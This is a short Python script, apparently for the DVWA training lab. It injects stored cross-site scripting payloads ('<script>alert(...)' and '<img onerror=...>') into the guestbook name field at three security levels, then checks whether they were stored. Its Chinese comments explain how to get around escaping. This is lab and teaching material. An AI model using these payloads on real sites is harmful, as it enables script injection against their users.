from dvwa import DVWA

SECURITY = "low"
PAYLOADS = {
    "low": "<script>alert(document.domain)</script>",
    "medium": "<img src=x onerror=alert(document.domain)>",
    "high": "<img src=x onerror=alert(document.domain)>",
}
"""
消息字段在 medium 和 high 会被转义, 所以 payload 放在名字字段.
每运行一次会往 guestbook 写一条记录, 测完记得清理.
"""

target = DVWA("xss_s", SECURITY)

payload = PAYLOADS[SECURITY]
target.post(
    "",
    data={
        "txtName": payload,
        "mtxMessage": "hello",
        "btnSign": "Sign Guestbook",
    },
)
page = target.get("")

print(f"Payload: {payload}")
print(f"Stored: {payload in page.text}")
print(f"用浏览器打开 {target.url} 确认弹窗.")
